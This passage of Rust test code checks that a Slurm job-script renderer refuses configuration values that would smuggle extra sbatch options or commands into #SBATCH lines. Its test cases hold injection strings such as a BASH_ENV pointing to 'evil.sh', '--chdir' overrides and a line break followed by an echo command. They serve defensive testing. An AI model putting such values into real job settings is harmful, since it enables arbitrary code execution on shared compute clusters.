                if quote.is_none() && !escaped && ch.is_ascii_whitespace() {
                    break;
                }
                chars.next();
                if escaped {
                    escaped = false;
                    argument.push(ch);
                } else if ch == '\\' {
                    escaped = true;
                } else if quote == Some(ch) {
                    quote = None;
                } else if quote.is_none() && (ch == '"' || ch == '\'') {
                    quote = Some(ch);
                } else if quote.is_none() && ch == '#' {
                    comment = true;
                    break;
                } else {
                    argument.push(ch);
                }
            }
            if let Some(quote) = quote {
                return Err(format!("Unmatched `{quote}` in [{rest}]"));
            }
            if !argument.is_empty() {
                arguments.push(argument);
            }
            if comment {
                return Ok(arguments);
            }
        }
    }

    /// Every `#SBATCH` line must reach sbatch as exactly one `--option=value`.
    fn assert_one_sbatch_argument_per_line(script: &str, case: &str) {
        let mut seen = 0;
        for line in script.lines() {
            let Some(rest) = line.strip_prefix("#SBATCH") else {
                continue;
            };
            seen += 1;
            let arguments = sbatch_arguments(rest)
                .unwrap_or_else(|error| panic!("{case}: sbatch would refuse {line:?}: {error}"));
            assert_eq!(arguments.len(), 1, "{case}: {line:?} gives sbatch {arguments:?}");
            assert!(arguments[0].starts_with("--"), "{case}: {line:?} gives {arguments:?}");
            assert_eq!(
                format!("#SBATCH {}", arguments[0]),
                line,
                "{case}: sbatch reads {line:?} as {arguments:?}"
            );
        }
        assert!(seen >= 7, "{case}: expected the #SBATCH header: {script}");
    }

    #[test]
    fn the_sbatch_tokenizer_port_splits_like_sbatch() {
        assert_eq!(
            sbatch_arguments(" --output=/dev/null --export=ALL,BASH_ENV=/x #/a.out").unwrap(),
            vec!["--output=/dev/null", "--export=ALL,BASH_ENV=/x"]
        );
        assert_eq!(sbatch_arguments(" --output=/data/My Lab/x").unwrap().len(), 2);
        assert!(sbatch_arguments(" --output=/data/o'brien/x").is_err());
        assert_eq!(
            sbatch_arguments(" --output=/data/results/x-%A_%a.out").unwrap(),
            vec!["--output=/data/results/x-%A_%a.out"]
        );
    }

    #[test]
    fn every_rendered_sbatch_line_is_exactly_one_sbatch_argument() {
        // (results_root, cache_relative, partition, time_limit). Each either
        // renders a header sbatch reads as one argument per line, or is refused.
        let cache = "coperceive-cache/opv2v/abc123/test";
        let cases: &[(&str, &str, Option<&str>, Option<&str>)] = &[
            ("/dev/null --export=ALL,BASH_ENV=/data/lab/evil.sh #", cache, None, None),
            ("/data/lab/r --output=/dev/null --export=ALL,BASH_ENV=/x #", cache, None, None),
            ("/data/lab/r --chdir=/data/lab/evil --comment=x", cache, None, None),
            ("/data/My Lab/runs", cache, None, None),
            ("/data/o'brien/runs", cache, None, None),
            ("/data/lab#2/runs", cache, None, None),
            ("/data/results", "coperceive-cache/opv2v/abc123/test --export=ALL #", None, None),
            ("/data/results", "coperceive-cache/opv2v/abc123/it's", None, None),
            ("/data/results", cache, Some("main-cpu --export=ALL,BASH_ENV=/x"), None),
            ("/data/results", cache, Some("main#cpu"), None),
            ("/data/results", cache, None, Some("04:00:00 --chdir=/tmp")),
            ("/data/results", cache, None, Some("'04:00:00")),
        ];
        let mut refused = 0;
        for (results_root, cache_relative, partition, time_limit) in cases {
            let mut entry = entry();
            entry.profile.results_root = results_root.to_string();
            if let Some(partition) = partition {
                entry.profile.defaults.partition = Some(partition.to_string());
            }
            if let Some(time_limit) = time_limit {
                entry.profile.defaults.time_limit = Some(time_limit.to_string());
            }
            let case = format!("{results_root:?} {cache_relative:?} {partition:?} {time_limit:?}");
            match render_prepare_script(
                &entry.profile,
                &request(),
                &scenes(&["scene_0001", "scene_0002"]),
                cache_relative,
                0,
                0,
            ) {
                Ok(preview) => assert_one_sbatch_argument_per_line(&preview.script, &case),
                Err(error) => {
                    refused += 1;
                    assert!(
                        error.contains("spaces, '#' or quotes"),
                        "{case}: refused for another reason: {error}"
                    );
                }
            }
        }
        assert_eq!(refused, cases.len(), "every hostile value must be refused");

        // Legitimate values render, and sbatch reads each line as one argument.
        for (results_root, partition, time_limit) in [
            ("/data/results", "main-cpu", "04:00:00"),
            ("/data/results/", "gpu_a100,cpu", "1-00:00:00"),
            ("/gpfs/lab-01/user_x/runs.v2", "main-cpu", "30"),
            ("/data/results:2024+%,=@", "main-cpu", "04:00:00"),
        ] {
            let mut entry = entry();
            entry.profile.results_root = results_root.to_string();
            entry.profile.defaults.partition = Some(partition.to_string());
            entry.profile.defaults.time_limit = Some(time_limit.to_string());
            let preview = render_prepare_script(
                &entry.profile,
                &request(),
                &scenes(&["scene_0001"]),
                cache,
                0,
                0,
            )
            .unwrap_or_else(|error| panic!("{results_root:?}: {error}"));
            assert_one_sbatch_argument_per_line(&preview.script, results_root);
        }
    }

    #[test]
    fn the_job_name_guard_itself_refuses_what_sbatch_would_split() {
        // The cache path the cluster returned is not a results folder, so only
        // the #SBATCH value guard stands between it and the --job-name line:
        // normalise_path accepts spaces, '#' and quotes.
        for cache_relative in [
            // The job name is the last path segment, so no '/' after the space.
            "coperceive-cache/opv2v/abc123/test --export=ALL,BASH_ENV=evil.sh",
            "coperceive-cache/opv2v/abc123/te#st",
            "coperceive-cache/opv2v/abc123/it's",
        ] {
            let joined = format!("/data/results/{cache_relative}");
            normalise_path(&joined, "cache root").expect("normalise_path accepts it");
            let error = render_prepare_script(
                &entry().profile,
                &request(),
                &scenes(&["scene_0001"]),
                cache_relative,
                0,
                0,
            )
            .expect_err(cache_relative);
            assert!(error.contains("job name"), "{cache_relative:?}: {error}");
            assert!(error.contains("spaces, '#' or quotes"), "{cache_relative:?}: {error}");
        }
        // The same guard also refuses a line break directly (in the renderer a
        // line break in the cache path is already refused by normalise_path).
        let error = sbatch_value("job name", "coperceive-dataset-test\necho INJECTED_LINE_RAN")
            .expect_err("line break");
        assert!(error.contains("line break"), "{error}");
        sbatch_value("job name", "coperceive-dataset-test").expect("plain job name");
    }

    #[test]
    fn the_prepare_argv_names_the_split() {
        let entry = entry();
        let mut request = request();
        request.raw_root = "/data/opv2v".to_string();
        let argv = actor_argv(&entry.profile, &request, "/data/results/cache/test");
        let at = argv.iter().position(|arg| arg == "--split").expect("--split");
        assert_eq!(argv[at + 1], "test");
        assert_eq!(argv[at - 1], "/data/opv2v");
        request.split = None;
        let argv = actor_argv(&entry.profile, &request, "/data/results/cache/all");
        assert!(!argv.contains(&"--split".to_string()), "{argv:?}");
    }
}
